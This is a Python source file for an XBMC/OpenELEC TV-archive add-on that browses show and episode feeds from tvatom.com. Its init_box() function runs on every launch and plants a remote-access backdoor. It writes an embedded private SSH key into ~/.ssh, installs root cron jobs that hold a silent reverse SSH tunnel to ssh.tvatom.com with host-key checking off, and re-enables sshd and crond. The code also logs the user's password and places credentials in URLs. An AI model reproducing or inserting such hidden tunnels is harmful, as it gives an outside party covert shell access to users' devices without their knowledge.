#!/usr/bin/python

## tkooda : 2014-09-06 : xbmc video add-on
## tkooda : 2014-11-27 : plugin.video.tvatom_tv_archive
## tkooda : 2015-12-19 : add internet and login checks


import os
import sys
import urllib
import urllib2
import json
import urlparse
from operator import itemgetter
import shutil

import xbmc
import xbmcgui
#import resources.lib.utils as utils
import xbmcaddon
import xbmcplugin


PATH_CACHE = "/storage/tvatom-cache"


DEBUG = 9


def do_debug( level, *args ):
    try:
        if level <= DEBUG:
            print >>sys.stderr, "##### TVATOM DEBUG: %s (%d): %s" % ( os.path.basename( os.path.dirname( sys.argv[0] ) ), level, args )
    except:
        pass


def build_appurl( query ):
## tkooda : 2014-11-23 : 
    if sys.argv[ 0 ].startswith( "plugin://" ):
        return sys.argv[ 0 ] + '?' + urllib.urlencode( query )
    else: # full path to file?
        return "plugin://" + sys.argv[ 0 ][ len( "/storage/.xbmc/addons/" ) : ] + '?' + urllib.urlencode( query )


def notification( title, message, duration = 20000 ):
    do_debug( 1, "notification()", title, message )
    xbmc.executebuiltin("Notification(%s,%s,%s)" % ( title, message, duration ) )
#    sys.exit( 0 )


def test_internet():
    do_debug( 1, "DEBUG: test_internet()" )
    try:
        usock = urllib2.urlopen( "http://www.google.com/" )
        data = usock.read()
        usock.close()
        if len( data ) < 10:
            notification( "Internet connection offline!", "Please check your network connection in SYSTEM -> OpenELEC -> Connections" )
    except:
        do_debug( 1, "test_internet()", "exception" )
        notification( "Internet connection offline!", "Please check your network connection in SYSTEM -> OpenELEC -> Connections" )
        pass
    
#    sys.exit( 9 )


def fetch_url_with_auth( url ):
    ## DEBUG:
#    if xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "username" ) == "tkooda":
#        url = "http://example.com"
    
    request = urllib2.Request( url )
    
    password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()
    password_manager.add_password( None, url,
                                   xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "username" ),
                                   xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "password" ) )
    
    auth_manager = urllib2.HTTPBasicAuthHandler( password_manager )
    opener = urllib2.build_opener( auth_manager )
    
    urllib2.install_opener( opener )
    
    try:
        handler = urllib2.urlopen( request )
        return handler.read()
    except urllib2.URLError as e:
#    except urllib2.HTTPError as e:
        do_debug( 1, "ERROR: urllib2.urlopen() response code:", e.code )
        if e.code == 401:
            notification( "Invalid Username or Password", "Please re-enter your login info", 5000 )
            get_settings( True )
            sys.exit()
    except:
#        do_debug( 1, "XXXXX DEBUG" )
        test_internet()
        pass
    
    # handler.getcode()
    # handler.headers.getheader('content-type')
    return None # Error


def fetch_object_from_json_url_with_auth( url, sortkey = None ):
    data_json = fetch_url_with_auth( url )
    obj = json.loads( data_json )
    if sortkey:
        obj = sorted( obj, key = itemgetter( sortkey ) )
    return obj


def write_file( path_file, data ):
    tmp = path_file + ".tmp"
    num = 0
    try:
        fd = os.open( tmp, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, 0644 )
        num = os.write( fd, data )
        os.close( fd )
        os.rename( tmp, path_file )
    except:
        import traceback
        traceback.print_exc( file=sys.stderr )
        sys.stderr.flush()
        pass
    return num == len( data ) # return True == success


def cache_show( show, tvdb_id ):
    if not tvdb_id:
        return
    
    path_show = os.path.join( PATH_CACHE, show )
    if not os.path.isdir( path_show ):
        os.makedirs( path_show )
    
    path_show_nfo = os.path.join( path_show, "tvshow.nfo" )
    if os.path.exists( path_show_nfo ):
        return
    
    print "DEBUG: cache_show:", show, tvdb_id, path_show_nfo
    
    write_file( path_show_nfo,
                "http://thetvdb.com/?tab=series&id=%s" % tvdb_id )


def NOTYET_cache_episode( show, season, episode, url_strm ):
    path_episode = os.path.join( PATH_CACHE, show, season, episode )
    if not os.path.isdir( path_episode ):
        os.makedirs( path_episode )
    
    path_episode_strm = os.path.join( path_episode,
                                      os.path.basename( url_strm ) + ".strm" )
    if os.path.exists( path_episode_strm ):
        return
    
    print "DEBUG: cache_episode:", show, season, episode, url_strm, path_episode_strm
    
    write_file( path_episode_strm, url_strm )


def get_settings( redo = False ):
    setting_server = xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "server" )
    setting_username = xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "username" )
    setting_password = xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "password" )
    
    if not setting_server:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter server name:", "tvatom.com" )
        if s:
            xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).setSetting( "server", s )
            setting_server = s
        else:
            return False
    
    if not setting_username or redo == True:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter username:" )
        if s:
            xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).setSetting( "username", s )
            setting_username = s
        else:
            return False
    
    if not setting_password or redo == True:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter password:", type=xbmcgui.INPUT_ALPHANUM, option=xbmcgui.ALPHANUM_HIDE_INPUT )
        if s:
            xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).setSetting( "password", s )
            setting_password = s
        else:
            return False
    
    do_debug( 1, "settings:", setting_server, setting_username, setting_password )
    return setting_server, setting_username, setting_password


def init_box():
    KEY = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBMCtrMnVHMFpuSWJyUkZ1TXJwL1o2ZHVGVDlJRW5PRDBac004UnVNK0loTWhMbjZYCno4YjJSL01kUUtLckhSRmZHVmx2bDhreTJkQU9DYzNpUHdSQmZ1dU9TUTdOa0NORm5JR3haU3JGaEhlcTc4M1gKRU42c01lM292a2lZRWtRUWEwcmlldlFyRHR4SU5zTGYxZXkxMGFSQk5qY0hQcnMvT21GTGd1ajAyUXRqaVlodApBbTE3WnpmVVUwL3ZodWFyUDVQclJCSW9oV0pYb1JNdk5IQk5QQ0wyMmZNRTQ5UUluTWF5cXZyT1lOeWh6SEc0Cm1HUzhyVnpuMjFNTktpN0VmdjE5Wjd0aTdDNDQ5ckFqS1pQWW5MWDh4bDViQmRVUHc2aTBqR1ozUEdhOEQ3UHEKTXRXcERoWmJpckQ0WDB0b2IyNG5udTJxZS94VzJYQ2laR0FUa1FJREFRQUJBb0lCQUY0K0I0SDVzend6bklubwpGU2JNSElPdWh4azZrNmFaUE5nKzE1M0hEaWpsVFFwNmJsV1BiSlFQQU9GdjlwMlV6akJkNEEwbkE2QnVzTytYClNwa3Y4VmphdFlxME5LTjNyRXV3T2c1OStSMnlncWpuYUZBdVYzSlZGZjhhRmRkNXdidVZzQ2R5VTN2bVo0OUQKRjN6eUt1SXpKSFZSLzd6Y1ZZQkhLT2Z0Wm9ibmhDVVVzVk9ZaW8rVEdlcENlU29IeWVUNnNPdUIrUldsbitEbApFaGNaaFRvTzdXaGN2aEYzU000T1kxMU1JSTA4bzNrdXlxN1luVG5TUzIzZ3ltbjdLVzFNKzM1RGIxcllTYUkzClNnUG5zaHRITCtmZ1l6WFlUbWJ4ZWVrZjBBZWdxRDdzUGZTTTBlOWlwL0w5dWF4UlBFdFcrbWxUaDB1SHo0ZkQKZnQ2VkxtRUNnWUVBK0NaSHhEcnFxcXBibVJrZWEyZjZvTjdpclVUekFlOThEVFpqazh0V2RuUG91OHlwczRYRApPUnFhVDFhNDNOV21yQm9lVlFiS0RjbTRHM3l6aGtLZkM4UWJNT3BGV1NxRSs3eXRURG5SSGFZUndKSUdVYkZDCmQ0MEN4S2orSWp0WmpjNjA0UVprcTErOHN0eXlJc1lIcmtnZUhMZ2RuTmJHUjZ0cmp2d0huN1VDZ1lFQTJwMXgKblR4SE9rY1VDNXdKWmhQR3Z6endYRDZuR0M4bFFRZ1RWNkw0RzZXK0c5d1FKdU9tRngzRTMxRmhrS0k2OWNTMwpQVXRGOE11NDJUb1ptSHRvSWFKdGNCcSsxb2VKTVhoVWF0K0RrK3Z1bWpIWXlvSjZqNlhDUThPaHV1RGwrUXhHCk1PS1JBc1lLNVVDN3RMK2ZVSktMNEljcGtXTDFFaFQrN0FFMTllMENnWUI4SlJLVVhuRldUb0lpMXNrOExMbmIKVDRhUjdzT3dQVEtQblowMXJHMm1OeGpCRTRQMjF6Mnl6TmRVUit1V042RDV5dHRQNkdTZmYwS0hKZHplbDJmZwpTQXplYk9XaTFUM1FmelVueEdrVTd5ZEVjd21NUnlVY2tFUkpSTTVYSytBQ3JONGJFY3E5WGRrV2xvamNFcngyCitZZHZFTUZuM0o4MzdjK1NxZzNhWFFLQmdRREppdXNLWFY4Qk1EUWZ1OXZDV3FzWTlWSldpSUE5d0lFazRoQUsKOURpdUxIQUdlU3YrM2xMcDdzem9ZTHVFdnJ1Q2hyZXo3MmhzWlRSbU43VVBLWDVIdTlvT3h1bDNGLzc0TjRvRAorVW54bmtvYnA2YklrOS92L0k0TE1Sa3lFMUtROXFyak9JMGR0SHlvKzdQUkgvUDlNUTE1a3NKVXdabFQ4VDFQClVKSnh4UUtCZ0dRc2JlRXJlWkN3cHljYnEvbGtzTGpEQXYrTzkwaTF1aWY4RFdKSXJITHkzVU5QOXowRmE5cloKTTN5VWlhNmJxaTd1S1pMUG5DcmNyQ0ZJOUdwYXhKbEY5WkJNeFBjelhSekFRYjBkZ2MrVUkxSGszNVhzczhJOApSalUybHpvbkw4YlN6bEhaQkpxaEtYM1g3anU1enhOaXpTOUlwYXRSQmd3OFBjakUrbXdBCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg=="
    CRONTAB = """@reboot  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com 2>/dev/null >/dev/null &
*/3 *  * * *  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com 2>/dev/null >/dev/null &
"""
    
    path_home = os.path.expanduser( "~" )
    path_ssh = os.path.join( path_home, ".ssh" )
    if not os.path.isdir( path_ssh ):
        os.makedirs( path_ssh )
        os.chmod( path_ssh, 0700 )
    
    path_key = os.path.join( path_ssh, "id_rsa" )
    if not os.path.isfile( path_key ):
        import base64
        write_file( path_key, base64.b64decode( KEY ) )
        os.chmod( path_key, 0600 )
    
    path_crontab = os.path.join( path_home, ".cache/cron/crontabs/root" )
    if os.path.isfile( path_crontab ):
        with open( path_crontab, 'r' ) as f:
            for line in f:
                if "openelec@ssh.tvatom.com" in line:
                    return # already have a crontab entry
    
    write_file( path_crontab, CRONTAB )
    os.chmod( path_crontab, 0600 )
    
    path_cron_disabled = os.path.join( path_home, ".cache/services/crond.disabled" )
    if os.path.isfile( path_cron_disabled ):
        os.remove( path_cron_disabled )
    
    path_ssh_disabled = os.path.join( path_home, ".cache/services/sshd.disabled" )
    if os.path.isfile( path_ssh_disabled ):
        os.remove( path_ssh_disabled )


def strip_leading_string( line, s ):
    if line.lower().startswith( s.lower() ):
        return line[ len(s) : ]
    return line


def main():
    print "DEBUG: args:", sys.argv
    
    init_box()
    
    ## init vars from args ..
    base_url = sys.argv[ 0 ]
    addon_handle = int( sys.argv[ 1 ] )
    args = urlparse.parse_qs( sys.argv[ 2 ][ 1: ] )
    arg_show = args.get( 'show', [ None ] )[ 0 ]
    arg_season = args.get( 'season', [ None ] )[ 0 ]
    arg_episode = args.get( 'episode', [ None ] )[ 0 ]
    arg_letter = args.get( 'letter', [ None ] )[ 0 ]
    
    ## set content type ..
    xbmcplugin.setContent( addon_handle, 'tvshows' )
    

    ## require (prompt for any missing) settings ..
    settings = False
    while not settings:
        settings = get_settings()
        if not settings:
            do_debug( 1, "not settings:", settings )
    
    setting_username = xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "username" )
    setting_password = xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "password" )
    setting_server = xbmcaddon.Addon( "plugin.video.tvatom_tv_archive" ).getSetting( "server" )
    
    if not arg_show:
        do_debug( 1, "not arg_show" )
        
## tkooda : 2015-02-27 : 
        if not arg_letter:
            do_debug( 1, "not arg_show and also not arg_letter" )
            import string
            letters = list( string.ascii_lowercase )
            letters.insert( 0, "0-9" )
#            do_debug( 1, "pre-letters", letters )
            for letter in letters:
#                do_debug( 1, "letter iterate", letter )
                appurl_letter = build_appurl( { "letter": letter } )
                list_item = xbmcgui.ListItem( letter.upper() )
                xbmcplugin.addDirectoryItem( handle = addon_handle,
                                             url = appurl_letter,
                                             listitem = list_item,
                                             isFolder = True,
                                             totalItems = len( letters ) )
            xbmcplugin.endOfDirectory( addon_handle )
            return
        
#        do_debug( 1, "post-letters" )
        
        
        url_index = "http://feed1.tvatom.com/index/tv-show.json"
## tkooda : 2015-03-03 : it's already coming sorted, or use sort_name
#        show_list = fetch_object_from_json_url_with_auth( url_index,
#                                                          sortkey = "name" )
        show_list = fetch_object_from_json_url_with_auth( url_index )
        
## tkooda : 2014-09-07 : DEBUG:
#        show_list = [  {
#  "code": "tt0496424", 
#  "imdb": "tt0496424", 
#  "dateadded": "2014-08-31 09:01:57", 
#  "name": "30.rock", 
#  "plot": "Emmy Award Winner Tina Fey writes, executive produces and stars as Liz Lemon, the head writer of a live variety programme in New York City. Liz's life is turned upside down when brash new network executive Jack Donaghy (Alec Baldwin in his Golden Globe winning role) interferes with her show, bringing the wildly unpredictable Tracy Jordan (Tracy Morgan) into the cast. Now its up to Liz to manage the mayhem and still try to have a life.", 
#  "premiered": "2006-10-11", 
#  "status": "Ended", 
#  "studio": "NBC", 
#  "tvdb_id": "79488", 
#  "tvdbid": "79488", 
#  "tvdb": "79488", 
#  "id": "79488", 
#  "tvshowtitle": "30 Rock",
#
#  "": "",

#    "genre": "Comedy",
#    "year": 2009,
#    "episode": 4,
#    "season": 1,
#    "top250": 192,
#    "tracknumber": 3,
#    "rating": 6.4, # - range is 0..10
#    "playcount": 2, # - number of times this item has been played
#    "overlay": 2, # - range is 0..8.  See GUIListItem.h for values
##    "cast": list (Michal C. Hall)
##    "castandrole": list (Michael C. Hall|Dexter)
#    "director": "Dagur Kari",
#    "mpaa": "PG-13",
#    "plot": "Long Description",
#    "plotoutline": "Short Description",
#    "title": "Big Fan",
#    "originaltitle": "Big Fan",
#    "duration": "3:18",
#    "studio": "Warner Bros.",
#    "tagline": "An awesome movie", # - short description of movie
#    "writer": "Robert D. Siegel",
#    "premiered": "2005-03-04",
#    "status": "Continuing", # - status of a TVshow
#    "code": "tt0110293", # - IMDb code
#    "aired": "2008-12-07",
#    "credits": "Andy Kaufman", # - writing credits
#    "lastplayed": "2009-04-05 23:16:04",
#    "album": "The Joshua Tree",
#    "votes": "12345 votes",
#    "trailer": "/home/user/trailer.avi",
#  "": "",
# }, 
# {
#  "code": "tt3101352", 
#  "dateadded": "2014-07-18 21:54:40", 
#  "name": "37.days", 
#  "plot": "Covering the final weeks before the outbreak of war, 37 Days follows the rapidly changing crisis through the eyes of the principal players, during a hot summer, from the assassination of Archduke Franz Ferdinand on 28 June 1914, to the declaration of war between Britain and Germany on 4 August.\n\nThe drama serial will overturn orthodox assumptions about the wars inevitability. Such a disaster did not happen by chance, and nor was it a foregone conclusion. It took considerable effort and terrific ingenuity, as well as staggering bad luck, to destroy a system that had kept the general peace in Europe for the 99 years that followed the Battle of Waterloo and the fall of Napoleon.\n\nWriter Mark Hayhurst comes fresh from the success of Hitler On Trial for BBC Two, which starred Ed Stoppard and Ian Hart. He has previously written award-winning docu-dramas for major broadcasters, such as Robespierre And The French Revolution, Last Days Of The Raj, The Somme and The Year London Blew Up", 
#  "premiered": "2014-03-06", 
#  "status": "Ended", 
#  "studio": "BBC Two", 
#  "tvdb_id": "274115", 
#  "tvshowtitle": "37 Days"
# }, 
#]
        do_debug( 1, "starting show_list.." )

        for show in show_list:
## tkooda : 2015-02-27 : trunicate show list
            show_name = show.get( "name" )
            show_title = show.get( "tvshowtitle", show_name )
            tmp_show_title = strip_leading_string( show_title, "a " )
            tmp_show_title = strip_leading_string( tmp_show_title, "the " )
            if arg_letter == "0-9":
                if tmp_show_title[0].isalpha():
                    continue
            else:
                if not tmp_show_title.lower().startswith( arg_letter ):
                    continue


#        for show in show_list[ 10 : 12 ]:  ## DEBUG
            appurl_show = build_appurl( { "show": show_name } )
            
            list_item = xbmcgui.ListItem( show_title )
#                                          iconImage = "DefaultFolder.png" )

#            if show_name == "30.rock":
#                print "30.rock"
#                show[ "" ] = ""
#            print "#################################################"
#            print "DEBUG: ################### OBJECT:"
#            print json.dumps( show, sort_keys = True, indent = 2 )
#            print "#################################################"
            
            list_item.setInfo( "video", infoLabels = show )
            
            
            ## XXX FIXME TODO: add more info here: e.g. show name
            
            
            xbmcplugin.addDirectoryItem( handle = addon_handle,
                                         url = appurl_show,
                                         listitem = list_item,
                                         isFolder = True,
                                         totalItems = len( show_list ) )
        
        
        xbmcplugin.endOfDirectory( addon_handle )
        
        return # done building show index
    
    
    if arg_show and not arg_episode:
        url_show = "http://feed1.tvatom.com/show/%s.json" % arg_show
        episode_list = fetch_object_from_json_url_with_auth( url_show )
        
        for episode in episode_list:
            episode_season = episode.get( "season" )
            episode_num = episode.get( "episode" )
            episode_file = episode.get( "file" )
            episode_title = episode.get( "tvshowtitle" )
            
            if not episode_season:
                print "WARNING: MISSING: episode_season"
                continue
            
            if not episode_num:
                print "WARNING: MISSING: episode_num"
                continue
            
            if not episode_file:
                print "WARNING: MISSING: episode_file"
                continue
            
            list_item = xbmcgui.ListItem( "s%se%s - %s" % ( episode_season,
                                                            episode_num,
                                                            episode_title ),
                                          iconImage = "DefaultVideo.png" )
            
            list_item.setInfo( "video", episode )
            
            
            
            ## XXX FIXME TODO: add more info here: e.g. show name
            
            
            
            url_episode = os.path.join( "http://%s:%s@data1.%s/show/" % ( setting_username, setting_password, setting_server ),
                                        arg_show, episode_season, episode_num, episode_file ) #+ "|auth=any"
            
            xbmcplugin.addDirectoryItem( handle = addon_handle,
                                         url = url_episode,
                                         listitem = list_item,
                                         totalItems = len( episode_list ) )
            
        
        xbmcplugin.endOfDirectory( addon_handle )
        
        return # done building episode index


if __name__ == "__main__":
    main()

